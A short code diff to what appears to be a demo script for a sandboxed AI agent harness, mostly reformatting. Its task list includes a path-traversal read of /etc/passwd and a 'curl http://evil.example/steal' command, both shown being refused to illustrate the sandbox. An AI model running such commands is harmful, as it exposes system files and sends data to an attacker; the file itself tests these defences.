@@ -39,11 +39,15 @@ print(f"Provider: {describe()}\n")
 sandbox = Sandbox("workspace", allowed_commands={"echo"})
 sandbox.write("welcome.txt", "This file lives safely inside the sandbox.")
 
-agent = Harness("You are an assistant with file and shell tools.", [READ_FILE, RUN_COMMAND], sandbox=sandbox)
+agent = Harness(
+    "You are an assistant with file and shell tools.",
+    [READ_FILE, RUN_COMMAND],
+    sandbox=sandbox,
+)
 
 for task in [
-    "read welcome.txt",              # inside the jail -> ok
-    "read ../../../../etc/passwd",   # escape attempt -> refused
+    "read welcome.txt",  # inside the jail -> ok
+    "read ../../../../etc/passwd",  # escape attempt -> refused
     "run echo hello from the sandbox",  # allowlisted -> runs
     "run curl http://evil.example/steal",  # not allowlisted -> refused
 ]:
